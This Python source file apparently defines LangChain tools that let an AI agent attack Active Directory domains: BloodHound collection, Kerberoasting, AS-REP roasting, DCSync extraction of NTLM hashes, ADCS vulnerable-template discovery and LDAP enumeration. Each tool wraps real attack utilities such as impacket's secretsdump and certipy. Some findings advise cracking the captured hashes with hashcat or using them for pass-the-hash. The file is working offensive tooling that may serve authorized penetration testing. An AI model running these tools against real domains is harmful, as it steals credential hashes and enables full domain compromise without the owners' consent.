"""Active Directory security tools — BloodHound, Kerberos, DCSync, ADCS, LDAP."""

from __future__ import annotations

import subprocess
from typing import ClassVar

from langchain_core.tools import BaseTool
from pydantic import BaseModel, Field

from rai.tools.core.findings import _add_finding


def _run_cmd(cmd: list[str], timeout: int = 120) -> str:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = result.stdout
        if result.stderr:
            output += f"\n[stderr]\n{result.stderr}"
        return output.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"Error: command timed out after {timeout}s"
    except Exception as exc:
        return f"Error: {exc}"


# ── BloodHound Collect ──────────────────────────────────────────────────────


class BloodHoundCollectInput(BaseModel):
    domain: str = Field(description="Target domain FQDN, e.g. 'corp.example.com'.")
    dc: str = Field(description="Domain controller IP or hostname.")
    username: str = Field(description="AD username for authentication.")
    password: str = Field(description="AD password for authentication.")
    method: str = Field(
        default="All",
        description="Collection method: All, DCOnly, ComputerOnly, Group, LocalAdmin, RDP, DCOM, Session, Trusts.",
    )
    output_dir: str = Field(default="/tmp/bloodhound", description="Output directory for BloodHound JSON files.")
    timeout: int = Field(default=300, description="Timeout in seconds.")


class BloodHoundCollectTool(BaseTool):
    """Run BloodHound data collection against an Active Directory domain."""

    name: str = "bloodhound_collect"
    description: str = (
        "Collect BloodHound data from an Active Directory domain using bloodhound-python. "
        "Outputs JSON files for import into BloodHound. "
        "Requires bloodhound-python: pip install bloodhound"
    )
    args_schema: ClassVar[type[BaseModel]] = BloodHoundCollectInput

    def _run(
        self,
        domain: str,
        dc: str,
        username: str,
        password: str,
        method: str = "All",
        output_dir: str = "/tmp/bloodhound",
        timeout: int = 300,
    ) -> str:
        import shutil
        tool = shutil.which("bloodhound-python") or shutil.which("bloodhound")
        if not tool:
            return "Error: bloodhound-python not found. Install: pip install bloodhound"
        import os
        os.makedirs(output_dir, exist_ok=True)
        cmd = [
            tool,
            "-d", domain,
            "-u", username,
            "-p", password,
            "-dc", dc,
            "-c", method,
            "-o", output_dir,
            "--zip",
        ]
        out = _run_cmd(cmd, timeout=timeout)
        if "error" not in out.lower() and "traceback" not in out.lower():
            _add_finding(
                title=f"BloodHound collection completed: {domain}",
                description=out[:500],
                severity="info",
                tool="bloodhound_collect",
            )
        return out


# ── Kerberoasting ──────────────────────────────────────────────────────────


class KerberoastInput(BaseModel):
    domain: str = Field(description="Target domain FQDN.")
    dc: str = Field(description="Domain controller IP or hostname.")
    username: str = Field(description="AD username.")
    password: str = Field(description="AD password.")
    request: bool = Field(default=True, description="Request tickets (True) or just list SPNs (False).")
    timeout: int = Field(default=120, description="Timeout in seconds.")


class KerberoastTool(BaseTool):
    """Enumerate and request kerberoastable service tickets from Active Directory."""

    name: str = "kerberoast"
    description: str = (
        "Enumerate kerberoastable service accounts (SPN holders) and optionally request "
        "TGS tickets for offline cracking. "
        "Requires impacket: pip install impacket"
    )
    args_schema: ClassVar[type[BaseModel]] = KerberoastInput

    def _run(
        self,
        domain: str,
        dc: str,
        username: str,
        password: str,
        request: bool = True,
        timeout: int = 120,
    ) -> str:
        import shutil
        tool = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
        if not tool:
            return "Error: impacket not found. Install: pip install impacket"
        cmd = [tool, f"{domain}/{username}:{password}", "-dc-ip", dc]
        if request:
            cmd.append("-request")
        out = _run_cmd(cmd, timeout=timeout)
        if "$krb5tgs$" in out:
            _add_finding(
                title=f"Kerberoastable accounts found in {domain}",
                description="TGS tickets extracted — crack offline with hashcat: hashcat -m 13100",
                severity="high",
                tool="kerberoast",
            )
        return out


# ── AS-REPRoasting ─────────────────────────────────────────────────────────


class ASREPRoastInput(BaseModel):
    domain: str = Field(description="Target domain FQDN.")
    dc: str = Field(description="Domain controller IP or hostname.")
    userfile: str = Field(default="", description="Path to a newline-delimited user list file. Empty = enumerate.")
    timeout: int = Field(default=120, description="Timeout in seconds.")


class ASREPRoastTool(BaseTool):
    """Identify and request AS-REP hashes for accounts with pre-auth disabled."""

    name: str = "asreproast"
    description: str = (
        "Find accounts with Kerberos pre-authentication disabled (AS-REP Roasting). "
        "Requests AS-REP hashes for offline cracking with hashcat -m 18200. "
        "Requires impacket: pip install impacket"
    )
    args_schema: ClassVar[type[BaseModel]] = ASREPRoastInput

    def _run(self, domain: str, dc: str, userfile: str = "", timeout: int = 120) -> str:
        import shutil
        tool = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if not tool:
            return "Error: impacket not found. Install: pip install impacket"
        cmd = [tool, f"{domain}/", "-dc-ip", dc, "-no-pass"]
        if userfile:
            cmd.extend(["-usersfile", userfile])
        else:
            cmd.append("-request")
        out = _run_cmd(cmd, timeout=timeout)
        if "$krb5asrep$" in out:
            _add_finding(
                title=f"AS-REP roastable accounts found in {domain}",
                description="Hash(es) extracted — crack offline: hashcat -m 18200",
                severity="high",
                tool="asreproast",
            )
        return out


# ── DCSync ─────────────────────────────────────────────────────────────────


class DCSyncInput(BaseModel):
    domain: str = Field(description="Target domain FQDN.")
    dc: str = Field(description="Domain controller IP or hostname.")
    username: str = Field(description="Account with DCSync rights (DS-Replication-Get-Changes-All).")
    password: str = Field(description="Password for the account.")
    target: str = Field(
        default="",
        description="Target account to replicate (e.g. 'krbtgt', 'Administrator'). Empty = all accounts.",
    )
    timeout: int = Field(default=180, description="Timeout in seconds.")


class DCSyncTool(BaseTool):
    """Perform a DCSync attack to extract password hashes from Active Directory."""

    name: str = "dcsync"
    description: str = (
        "Perform DCSync to extract NTLM hashes via the MS-DRSR replication protocol. "
        "Requires an account with DS-Replication-Get-Changes-All privilege. "
        "Requires impacket: pip install impacket"
    )
    args_schema: ClassVar[type[BaseModel]] = DCSyncInput

    def _run(
        self,
        domain: str,
        dc: str,
        username: str,
        password: str,
        target: str = "",
        timeout: int = 180,
    ) -> str:
        import shutil
        tool = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
        if not tool:
            return "Error: impacket not found. Install: pip install impacket"
        cmd = [tool, f"{domain}/{username}:{password}@{dc}", "-just-dc"]
        if target:
            cmd.extend(["-just-dc-user", target])
        out = _run_cmd(cmd, timeout=timeout)
        if ":::" in out:
            _add_finding(
                title=f"DCSync successful — NTLM hashes extracted from {domain}",
                description="Full domain compromise possible. Pass-the-Hash or crack offline.",
                severity="critical",
                tool="dcsync",
            )
        return out


# ── ADCS Audit ─────────────────────────────────────────────────────────────


class ADCSAuditInput(BaseModel):
    domain: str = Field(description="Target domain FQDN.")
    dc: str = Field(description="Domain controller IP or hostname.")
    username: str = Field(description="AD username.")
    password: str = Field(description="AD password.")
    timeout: int = Field(default=120, description="Timeout in seconds.")


class ADCSAuditTool(BaseTool):
    """Audit Active Directory Certificate Services for vulnerable templates (ESC1-ESC8)."""

    name: str = "adcs_audit"
    description: str = (
        "Audit ADCS certificate templates for ESC1-ESC8 vulnerabilities using certipy. "
        "Finds misconfigured templates that allow privilege escalation or domain compromise. "
        "Requires certipy-ad: pip install certipy-ad"
    )
    args_schema: ClassVar[type[BaseModel]] = ADCSAuditInput

    def _run(self, domain: str, dc: str, username: str, password: str, timeout: int = 120) -> str:
        import shutil
        tool = shutil.which("certipy") or shutil.which("certipy-ad")
        if not tool:
            return "Error: certipy not found. Install: pip install certipy-ad"
        cmd = [tool, "find", "-u", f"{username}@{domain}", "-p", password, "-dc-ip", dc, "-vulnerable"]
        out = _run_cmd(cmd, timeout=timeout)
        if "ESC" in out:
            _add_finding(
                title=f"Vulnerable ADCS templates found in {domain}",
                description=out[:500],
                severity="critical",
                tool="adcs_audit",
            )
        return out


# ── LDAP Enum ──────────────────────────────────────────────────────────────


class LDAPEnumInput(BaseModel):
    domain: str = Field(description="Target domain FQDN.")
    dc: str = Field(description="Domain controller IP or hostname.")
    username: str = Field(description="AD username.")
    password: str = Field(description="AD password.")
    filter: str = Field(
        default="(objectClass=user)",
        description="LDAP filter, e.g. '(objectClass=computer)', '(&(objectClass=user)(adminCount=1))'.",
    )
    attributes: str = Field(
        default="sAMAccountName,description,memberOf",
        description="Comma-separated list of attributes to retrieve.",
    )
    timeout: int = Field(default=60, description="Timeout in seconds.")


class LDAPEnumTool(BaseTool):
    """Enumerate Active Directory via LDAP queries."""

    name: str = "ldap_enum"
    description: str = (
        "Run LDAP queries against Active Directory for enumeration. "
        "Common filters: (objectClass=user), (objectClass=computer), "
        "(&(objectClass=user)(adminCount=1)) for admins. "
        "Uses ldapsearch or impacket as backend."
    )
    args_schema: ClassVar[type[BaseModel]] = LDAPEnumInput

    def _run(
        self,
        domain: str,
        dc: str,
        username: str,
        password: str,
        filter: str = "(objectClass=user)",
        attributes: str = "sAMAccountName,description,memberOf",
        timeout: int = 60,
    ) -> str:
        import shutil
        attr_list = [a.strip() for a in attributes.split(",") if a.strip()]
        if shutil.which("ldapsearch"):
            dn = "DC=" + ",DC=".join(domain.split("."))
            cmd = [
                "ldapsearch",
                "-x", "-H", f"ldap://{dc}",
                "-D", f"{username}@{domain}",
                "-w", password,
                "-b", dn,
                filter,
            ] + attr_list
            return _run_cmd(cmd, timeout=timeout)
        tool = shutil.which("GetADUsers.py") or shutil.which("impacket-GetADUsers")
        if tool:
            cmd = [tool, "-all", f"{domain}/{username}:{password}", "-dc-ip", dc]
            return _run_cmd(cmd, timeout=timeout)
        return (
            "Error: neither ldapsearch nor impacket found.\n"
            "Install: apt install ldap-utils  OR  pip install impacket"
        )


# ── Factory ────────────────────────────────────────────────────────────────


def get_ad_tools() -> list[BaseTool]:
    return [
        BloodHoundCollectTool(),
        KerberoastTool(),
        ASREPRoastTool(),
        DCSyncTool(),
        ADCSAuditTool(),
        LDAPEnumTool(),
    ]
